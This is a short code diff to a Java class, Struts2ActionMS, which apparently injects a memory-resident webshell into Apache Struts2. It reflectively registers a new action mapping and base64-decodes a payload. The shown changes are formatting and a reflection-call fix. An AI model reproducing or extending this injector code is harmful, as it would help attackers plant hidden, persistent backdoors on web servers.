@@ -37,10 +37,10 @@ public class Struts2ActionMS {
 
                 java.lang.reflect.Constructor<?> constructor = Class.forName("com.opensymphony.xwork2.config.entities.ActionConfig", false, loader).getDeclaredConstructor(new Class[]{String.class, String.class, String.class});
                 constructor.setAccessible(true);
-                Object                  actionConfig = constructor.newInstance("", pattern, selfName);
+                Object actionConfig = constructor.newInstance("", pattern, selfName);
 
                 // 这里常见的 context 是 "" 或者 "/"，在额外配置的时候可能需要额外处理
-                java.util.LinkedHashMap o1           = (java.util.LinkedHashMap) m.get("");
+                java.util.LinkedHashMap o1 = (java.util.LinkedHashMap) m.get("");
 
                 if (o1 == null) {
                     o1 = (java.util.LinkedHashMap) m.get("/");
@@ -96,7 +96,7 @@ public class Struts2ActionMS {
         byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
         } catch (Exception e) {
             try {
